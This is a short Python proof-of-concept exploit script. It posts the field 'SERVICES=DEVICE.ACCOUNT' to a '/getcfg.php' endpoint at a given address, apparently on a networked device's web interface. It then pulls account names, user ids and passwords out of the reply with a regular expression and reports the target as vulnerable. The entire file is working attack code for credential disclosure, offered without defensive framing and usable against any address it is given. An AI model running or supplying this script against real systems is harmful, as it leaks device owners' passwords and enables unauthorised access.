#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'

import requests
import re

def poc(address):
    url = "http://{}/getcfg.php".format(address)
    data = {"SERVICES": "DEVICE.ACCOUNT"}
    try:
        response = requests.post(url=url, data=data)
        if response is None:
            return False  # target is not vulnerable

        # extracting credentials
        regular = "<name>(.+?)</name><usrid>(|.+?)</usrid><password>(|.+?)</password>"
        creds = re.findall(regular, re.sub('\s+', '', response.text))

        if len(creds):
            return address  # target is vulnerable
    except requests.RequestException as e:
        # print e
        return False
    except Exception as e:
        # print e
        return False

    return False  # target is not vulnerable